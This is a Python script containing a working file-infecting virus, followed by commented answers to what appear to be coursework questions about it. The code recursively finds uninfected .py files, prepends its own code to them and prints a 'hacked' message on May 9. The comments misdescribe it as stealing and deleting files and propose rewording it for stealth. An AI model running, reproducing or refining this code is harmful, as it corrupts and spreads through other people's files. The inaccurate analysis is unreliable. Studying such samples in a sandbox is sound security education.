#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()


 #Identify all the core Python/coding tools used by this script, e.g. functions.

#import OS
#If
#For
#Print
#functions
#Date and time
#variables
#arrays



# What kind of malware is this? Define this type of malware in your own words.

#Well for starters anything that says "Vrius" in it is not good. It is never recommend to run anything or supsected virus in a real environment. Always use sandbox testing. 
#This is script that will activate at a specific time or day and it will keep repeating itself
#It will find and locate files and steal and delte them

# How well is this code written? Would you have done something differently to achieve the same objective?

#This is well written script, but for stealth purposes I would change a lot of the verbage to not be so obvious. 